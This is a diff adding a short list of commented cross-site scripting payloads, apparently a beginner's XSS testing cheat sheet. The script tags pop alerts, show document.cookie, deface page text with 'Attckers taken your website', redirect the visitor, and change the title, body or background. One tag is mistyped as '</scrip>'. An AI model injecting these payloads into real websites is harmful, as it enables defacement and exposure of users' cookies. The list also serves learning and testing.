@@ -1,0 +1,29 @@
+///Simple print hello message.
+<script>alert("simple hello message.");</script>
+
+///change the text of your div according to id.
+<script>document.getElementById("a").innerHTML="Attckers taken your website";</script>
+
+///redirect to google.com.
+<script>window.location='https://www.google.com/';</script>
+
+///alert cookies
+<script>alert(document.cookie);</script>
+
+// change the way of scripting to onload or onhover or anything with built in function
+<script>document.onload=alert("a");</scrip>
+
+//change the title of any web site using script
+<script>document.title="New new brand new title";</script>
+
+//Chage the body to whatever 
+<script>document.body.innerText="How you doooing";</script>
+
+//Change background color of any website
+<script>document.body.style.background="green";</script>
+
+//Send to back page from history by applying script
+<script>window.history.back()</script>
+
+//Send to forward page from history by applying script
+<script>window.history.forward()</script>
